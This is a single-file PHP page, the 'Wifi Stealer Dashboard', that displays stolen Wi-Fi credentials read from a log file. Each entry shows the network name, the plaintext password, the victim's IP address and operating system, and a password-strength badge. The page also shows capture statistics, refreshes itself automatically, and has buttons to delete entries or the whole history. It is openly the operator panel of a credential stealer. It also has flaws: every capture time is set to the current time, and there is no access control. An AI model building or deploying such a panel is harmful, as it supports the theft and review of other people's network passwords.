<?php
// Wifi Stealer Dashboard - single file

date_default_timezone_set('Asia/Kolkata');

$logFile = __DIR__ . '/wifi_creds.log';

// Handle "clear all history"
if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
    if (file_exists($logFile)) {
        $fh = fopen($logFile, 'w');
        if ($fh) {
            fclose($fh);
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Handle "delete one entry"
if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
    $idx = isset($_POST['idx']) ? intval($_POST['idx']) : -1;

    if (file_exists($logFile) && $idx >= 0) {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (isset($lines[$idx])) {
            unset($lines[$idx]);
            file_put_contents($logFile, implode(PHP_EOL, $lines) . PHP_EOL);
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Viewer meta (person looking at dashboard)
function detect_os_from_ua(string $ua): string {
    $uaLower = strtolower($ua);
    if (strpos($uaLower, 'windows') !== false) {
        return 'Windows';
    }
    if (strpos($uaLower, 'android') !== false) {
        return 'Android';
    }
    if (strpos($uaLower, 'iphone') !== false || strpos($uaLower, 'ipad') !== false || strpos($uaLower, 'ios') !== false) {
        return 'iOS';
    }
    if (strpos($uaLower, 'mac os') !== false || strpos($uaLower, 'macintosh') !== false) {
        return 'macOS';
    }
    if (strpos($uaLower, 'linux') !== false) {
        return 'Linux';
    }
    return 'Unknown';
}

$viewerIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$viewerUa = $_SERVER['HTTP_USER_AGENT'] ?? '';
$viewerOs = detect_os_from_ua($viewerUa);

// Load log lines
$lines = [];
if (file_exists($logFile)) {
    $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}

// Stats + parsed entries
$totalCaptures = 0;
$ssidCounts = [];
$ipCounts = [];
$totalPwLength = 0;
$weakCount = 0;
$entries = [];

// Parse CSV log: "profile_name","password","ip","os"
foreach ($lines as $i => $entry) {
    $entry = trim($entry);
    if ($entry === '') {
        continue;
    }

    // Skip header line
    if (stripos($entry, 'profile_name') !== false &&
        stripos($entry, 'password') !== false &&
        stripos($entry, 'ip') !== false &&
        stripos($entry, 'os') !== false) {
        continue;
    }

    $parts = str_getcsv($entry);
    if (count($parts) < 4) {
        continue;
    }

    $ssid     = trim($parts[0]);
    $password = trim($parts[1]);
    $ip       = trim($parts[2]);
    $os       = trim($parts[3]);

    // Use "now" as capture display time
    $tsRaw = date('Y-m-d H:i:s');
    $ts = strtotime($tsRaw);
    $displayTime = $ts ? date('d M Y, h:i:s a', $ts) : htmlspecialchars($tsRaw);

    $totalCaptures++;

    if ($ssid !== '') {
        $ssidCounts[$ssid] = ($ssidCounts[$ssid] ?? 0) + 1;
    }
    if ($ip !== '') {
        $ipCounts[$ip] = ($ipCounts[$ip] ?? 0) + 1;
    }

    $len = strlen($password);
    $totalPwLength += $len;

    $onlyLetters = ($password !== '' && ctype_alpha($password));
    $onlyDigits  = ($password !== '' && ctype_digit($password));
    $isWeak = ($len < 8 || $onlyLetters || $onlyDigits);

    if ($isWeak) {
        $weakCount++;
    }

    $entries[] = [
        'idx'      => $i,
        'time'     => $displayTime,
        'ip'       => $ip,
        'os'       => $os,
        'ssid'     => $ssid,
        'password' => $password,
        'len'      => $len,
        'weak'     => $isWeak,
    ];
}

$uniqueSsids = count($ssidCounts);
$uniqueIps   = count($ipCounts);
$avgPwLength = $totalCaptures > 0 ? round($totalPwLength / $totalCaptures, 1) : 0;
$weakPercent = $totalCaptures > 0 ? round(($weakCount / $totalCaptures) * 100, 1) : 0.0;

// View mode: full or compact
$view = $_GET['view'] ?? 'full';
$view = $view === 'compact' ? 'compact' : 'full';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Wifi Stealer Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        body {
            margin: 0;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background: radial-gradient(circle at top left, #0f172a 0, #020617 40%, #000 100%);
            color: #e5e7eb;
        }
        .page {
            max-width: 1100px;
            margin: 0 auto;
            padding: 16px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        .page-header {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
        }
        .title-group {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        .title {
            font-size: 22px;
            font-weight: 600;
        }
        .subtitle {
            font-size: 12px;
            color: #9ca3af;
        }
        .viewer-meta {
            font-size: 11px;
            color: #9ca3af;
        }
        .actions {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        .btn {
            font-size: 12px;
            border-radius: 999px;
            padding: 6px 12px;
            border: 1px solid rgba(148,163,184,0.5);
            background: linear-gradient(135deg, rgba(15,23,42,0.95), rgba(15,23,42,0.6));
            color: #e5e7eb;
            cursor: pointer;
        }
        .btn:hover {
            border-color: #4f46e5;
            box-shadow: 0 0 0 1px rgba(79,70,229,0.5);
        }
        .btn-danger {
            border-color: rgba(248,113,113,0.7);
            color: #fecaca;
            background: linear-gradient(135deg, rgba(127,29,29,0.9), rgba(127,29,29,0.6));
        }
        .btn-danger:hover {
            box-shadow: 0 0 0 1px rgba(248,113,113,0.7);
        }
        .btn-sm {
            padding: 4px 8px;
            font-size: 11px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 12px;
        }
        .stat-card {
            background: #0f172a;
            border-radius: 10px;
            padding: 10px 12px;
            border: 1px solid rgba(148,163,184,0.25);
        }
        .stat-label {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            color: #9ca3af;
        }
        .stat-value {
            margin-top: 4px;
            font-size: 18px;
            font-weight: 600;
            color: #e5e7eb;
        }

        .card {
            background: rgba(15,23,42,0.95);
            border-radius: 12px;
            border: 1px solid rgba(148,163,184,0.3);
            box-shadow: 0 22px 45px rgba(15,23,42,0.7);
            padding: 12px 14px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        th, td {
            padding: 6px 8px;
            border-bottom: 1px solid rgba(55,65,81,0.8);
            text-align: left;
        }
        th {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            color: #9ca3af;
            background: radial-gradient(circle at top left, rgba(79,70,229,0.25), transparent 60%);
        }
        tr:hover {
            background: rgba(31,41,55,0.7);
        }
        .badge {
            display: inline-block;
            border-radius: 999px;
            padding: 2px 6px;
            font-size: 10px;
        }
        .badge-weak {
            background: rgba(248,113,113,0.18);
            color: #fecaca;
        }
        .badge-ok {
            background: rgba(74,222,128,0.18);
            color: #bbf7d0;
        }
        .password {
            font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
        }
        .footer {
            margin-top: auto;
            font-size: 11px;
            color: #6b7280;
            text-align: center;
            padding-top: 8px;
            border-top: 1px solid rgba(31,41,55,0.9);
        }
    </style>

    <script>
        let autoRefreshEnabled = false;
        let autoRefreshInterval = null;
        const AUTO_REFRESH_MS = 10000; // 10 seconds

        function setAutoRefresh(on) {
            autoRefreshEnabled = on;
            if (autoRefreshInterval) {
                clearInterval(autoRefreshInterval);
                autoRefreshInterval = null;
            }
            const btn = document.getElementById('auto-refresh-toggle');
            if (autoRefreshEnabled) {
                autoRefreshInterval = setInterval(function () {
                    window.location.reload();
                }, AUTO_REFRESH_MS);
                if (btn) {
                    btn.innerText = 'Auto-refresh: ON';
                }
                if (window.localStorage) {
                    localStorage.setItem('wifi_dashboard_auto_refresh', 'on');
                }
            } else {
                if (btn) {
                    btn.innerText = 'Auto-refresh: OFF';
                }
                if (window.localStorage) {
                    localStorage.setItem('wifi_dashboard_auto_refresh', 'off');
                }
            }
        }

        document.addEventListener('DOMContentLoaded', function () {
            let defaultOn = true;
            let stored = null;

            if (window.localStorage) {
                stored = localStorage.getItem('wifi_dashboard_auto_refresh');
            }

            if (stored === 'on' || (stored === null && defaultOn)) {
                setAutoRefresh(true);
            } else {
                setAutoRefresh(false);
            }
        });
    </script>
</head>
<body>
<div class="page">
    <div class="page-header">
        <div class="title-group">
            <div class="title">Wifi Stealer Dashboard</div>
            <div class="subtitle">
                Captures: <?php echo htmlspecialchars($totalCaptures); ?> •
                Timezone: IST (12-hour)
            </div>
            <div class="viewer-meta">
                You are viewing from IP <?php echo htmlspecialchars($viewerIp); ?> on <?php echo htmlspecialchars($viewerOs); ?>
            </div>
        </div>
        <div class="actions">
            <!-- View mode buttons -->
            <a href="?view=full" class="btn btn-sm"
               style="text-decoration:none; <?php echo $view === 'full' ? 'border-color:#4f46e5;' : ''; ?>">
                Full view
            </a>
            <a href="?view=compact" class="btn btn-sm"
               style="text-decoration:none; <?php echo $view === 'compact' ? 'border-color:#4f46e5;' : ''; ?>">
                Compact view
            </a>

            <!-- Auto-refresh toggle -->
            <button type="button"
                    class="btn"
                    id="auto-refresh-toggle"
                    onclick="setAutoRefresh(!autoRefreshEnabled);">
                Auto-refresh: OFF
            </button>

            <!-- Clear all history -->
            <form method="post"
                  onsubmit="return confirm('Delete ALL history? This cannot be undone.');"
                  style="display:inline;">
                <input type="hidden" name="action" value="clear_all">
                <button type="submit" class="btn btn-danger">
                    Clear all history
                </button>
            </form>
        </div>
    </div>

    <!-- Defensive stats -->
    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-label">Total captures</div>
            <div class="stat-value"><?php echo htmlspecialchars($totalCaptures); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Unique SSIDs</div>
            <div class="stat-value"><?php echo htmlspecialchars($uniqueSsids); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Source IPs</div>
            <div class="stat-value"><?php echo htmlspecialchars($uniqueIps); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Avg password length</div>
            <div class="stat-value"><?php echo htmlspecialchars($avgPwLength); ?></div>
        </div>
        <div class="stat-card">
            <div class="stat-label">Weak passwords</div>
            <div class="stat-value"><?php echo htmlspecialchars($weakPercent); ?>%</div>
        </div>
    </div>

    <div class="card">
        <table>
            <thead>
            <tr>
                <th>#</th>
                <th>Time (IST)</th>
                <?php if ($view === 'full'): ?>
                    <th>Source IP</th>
                    <th>OS</th>
                <?php endif; ?>
                <th>SSID</th>
                <?php if ($view === 'full'): ?>
                    <th>Password</th>
                    <th>Length</th>
                    <th>Strength</th>
                <?php else: ?>
                    <th>Pass / strength</th>
                <?php endif; ?>
                <th>Actions</th>
            </tr>
            </thead>
            <tbody>
            <?php if (empty($entries)): ?>
                <tr>
                    <td colspan="9" style="text-align:center; padding:12px; color:#9ca3af;">
                        No captures yet.
                    </td>
                </tr>
            <?php else: ?>
                <?php foreach ($entries as $row): ?>
                    <tr>
                        <td><?php echo htmlspecialchars($row['idx']); ?></td>
                        <td><?php echo htmlspecialchars($row['time']); ?></td>

                        <?php if ($view === 'full'): ?>
                            <td><?php echo htmlspecialchars($row['ip']); ?></td>
                            <td><?php echo htmlspecialchars($row['os']); ?></td>
                        <?php endif; ?>

                        <td><?php echo htmlspecialchars($row['ssid']); ?></td>

                        <?php if ($view === 'full'): ?>
                            <td class="password">
                                <?php echo htmlspecialchars($row['password']); ?>
                            </td>
                            <td><?php echo htmlspecialchars($row['len']); ?></td>
                            <td>
                                <?php if ($row['weak']): ?>
                                    <span class="badge badge-weak">weak</span>
                                <?php else: ?>
                                    <span class="badge badge-ok">ok</span>
                                <?php endif; ?>
                            </td>
                        <?php else: ?>
                            <td>
                                <span class="password">
                                    <?php echo htmlspecialchars($row['password']); ?>
                                </span>
                                <br>
                                <?php if ($row['weak']): ?>
                                    <span class="badge badge-weak">weak</span>
                                <?php else: ?>
                                    <span class="badge badge-ok">ok</span>
                                <?php endif; ?>
                            </td>
                        <?php endif; ?>

                        <td>
                            <form method="post"
                                  style="display:inline;"
                                  onsubmit="return confirm('Delete this entry?');">
                                <input type="hidden" name="action" value="delete_one">
                                <input type="hidden" name="idx" value="<?php echo htmlspecialchars($row['idx']); ?>">
                                <button type="submit" class="btn btn-sm btn-danger">
                                    Delete
                                </button>
                            </form>
                        </td>
                    </tr>
                <?php endforeach; ?>
            <?php endif; ?>
            </tbody>
        </table>
    </div>

    <div class="footer">
        © 2026 Wifi Stealer Dashboard – made by narain
    </div>
</div>
</body>
</html>
